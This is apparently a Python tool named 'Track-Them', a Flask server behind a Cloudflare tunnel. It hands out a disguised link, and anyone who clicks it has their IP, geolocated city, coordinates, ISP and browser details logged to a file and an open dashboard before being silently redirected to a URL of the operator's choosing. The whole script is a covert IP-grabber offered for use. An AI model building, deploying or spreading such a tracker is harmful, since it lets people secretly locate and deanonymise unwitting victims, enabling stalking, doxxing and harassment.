import os
import requests
import logging
import datetime
import subprocess
import threading
from flask import Flask, request, redirect, render_template_string

# Function to display banner
def show_banner():
    banner = r"""
                       ______
                    .-"      "-.
                   /  *ViRuS*   \
       _          |              |          _
      ( \         |,  .-.  .-.  ,|         / )
       > "=._     | )(_0_/\_0_)( |     _.=" <
      (_/"=._"=._ |/     /\     \| _.="_.="\_)
             "=._ (_     ^^     _)"_.="
                 "=\__|IIIIII|__/="
                _.="| \IIIIII/ |"=._
      _     _.="_.="\          /"=._"=._     _
     ( \_.="_.="     `--------`     "=._"=._/ )
      > _.="                            "=._ <
     (_/                                    \_)
 ____________________________________________________
 ----------------------------------------------------        
        #  Track-Them
        #  Author : The-Real-Virus
        #  https://github.com/The-Real-Virus
 ____________________________________________________
 ----------------------------------------------------
"""
    print(banner)

# Show banner at script startup
show_banner()

choice = input("\nPress 'y' to continue or 'n' to exit: ").strip().lower()

if choice == 'n':
    print("\nExiting the script. Goodbye!")
    exit()
elif choice == 'y':
    os.system('clear' if os.name == 'posix' else 'cls')  # Clear screen on Linux/Mac ('clear') or Windows ('cls')
else:
    print("\nInvalid choice. Exiting the script.")
    exit()

app = Flask(__name__)

# Store logs for real-time dashboard
log_entries = []

# Function to get visitor IP
def get_visitor_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    return ip.split(",")[0].strip() if ip and "," in ip else ip

# Function to get IP details
def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipwho.is/{ip}")
        data = response.json()
        if data.get("success"):
            return {
                "ip": ip,
                "city": data.get("city", "Unknown"),
                "region": data.get("region", "Unknown"),
                "country": data.get("country", "Unknown"),
                "lat": data.get("latitude", "Unknown"),
                "lon": data.get("longitude", "Unknown"),
                "isp": data.get("connection", {}).get("isp", "Unknown"),
                "timezone": data.get("timezone", {}).get("id", "Unknown"),
            }
    except:
        pass
    return {"ip": ip, "error": "Could not fetch IP details"}

# Function to install and configure Cloudflare Tunnel
def setup_cloudflare():
    if not os.path.exists("/usr/local/bin/cloudflared"):
        print("\n[⚠] Cloudflare Tunnel not found. Installing now...\n")
        os.system("wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
        os.system("chmod +x cloudflared")
        os.system("sudo mv cloudflared /usr/local/bin/")
        print("\n✅ Cloudflare Tunnel installed successfully!")

# Function to start Cloudflare Tunnel
def start_cloudflare():
    print("\n[🔄] Starting Cloudflare Tunnel...")
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    for line in process.stderr:
        if "trycloudflare.com" in line:
            parts = line.split()
            for part in parts:
                if "https://" in part:
                    return part.strip()  # Extract the full URL correctly
    return None

# Ask user for redirection URL
redirect_url = input("\n[🔗] Enter the URL where you want to redirect users: ").strip()

tunnel_url = None

setup_cloudflare()

tunnel_url = start_cloudflare()

if not tunnel_url:
    print("\n❌ Error starting tunnel. Exiting...")
    exit()

# Print the tracking links properly formatted
print("\n" + "=" * 95)
print(f"✅ Tracking link generated:  {tunnel_url}")
print(f"📊 View real-time logs:      {tunnel_url}/dashboard")
print("=" * 95)

@app.route('/')
def track():
    ip = get_visitor_ip()
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get IP geolocation
    ip_info = get_ip_info(ip)

    # Log details
    log_data = {
        "Time": timestamp,
        "IP": ip,
        "City": ip_info['city'],
        "Region": ip_info['region'],
        "Country": ip_info['country'],
        "Latitude": ip_info['lat'],
        "Longitude": ip_info['lon'],
        "ISP": ip_info['isp'],
        "Timezone": ip_info['timezone'],
        "User-Agent": user_agent,
    }

    # Store log entry for real-time dashboard
    log_entries.append(log_data)

    # Print log in terminal (properly aligned)
    print("\n[🔍 Visitor Logged]")
    print(f"Time:       {timestamp}")
    print(f"IP:         {ip}")
    print(f"City:       {ip_info['city']}")
    print(f"Region:     {ip_info['region']}")
    print(f"Country:    {ip_info['country']}")
    print(f"Latitude:   {ip_info['lat']}")
    print(f"Longitude:  {ip_info['lon']}")
    print(f"ISP:        {ip_info['isp']}")
    print(f"Timezone:   {ip_info['timezone']}")
    print(f"User-Agent: {user_agent}")
    print("-" * 40)

    # Save log to file
    with open("log.txt", "a") as file:
        file.write(str(log_data) + "\n")

    # Redirect user
    return redirect(redirect_url)

# HTML template for real-time dashboard
dashboard_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Real-Time IP Tracker</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; }
        h1 { color: #333; }
        table { width: 90%; margin: 20px auto; border-collapse: collapse; background: white; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background: #333; color: white; }
        tr:nth-child(even) { background: #f2f2f2; }
    </style>
    <script>
        setInterval(() => { location.reload(); }, 5000);
    </script>
</head>
<body>
    <h1>Real-Time IP Tracker Dashboard</h1>
    <table>
        <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Location</th>
            <th>ISP</th>
            <th>User-Agent</th>
        </tr>
        {% for log in logs %}
        <tr>
            <td>{{ log["Time"] }}</td>
            <td>{{ log["IP"] }}</td>
            <td>{{ log["City"] }}, {{ log["Region"] }}, {{ log["Country"] }}</td>
            <td>{{ log["ISP"] }}</td>
            <td>{{ log["User-Agent"] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# Real-time dashboard route
@app.route('/dashboard')
def dashboard():
    return render_template_string(dashboard_template, logs=log_entries)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)  # Hide Flask's default logs

# Run Flask app
if __name__ == '__main__':
    print("\n[🚀] Starting Flask server...\n", flush=True)
    print("[X] Press CTRL + C To Exit....", flush=True)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=False)
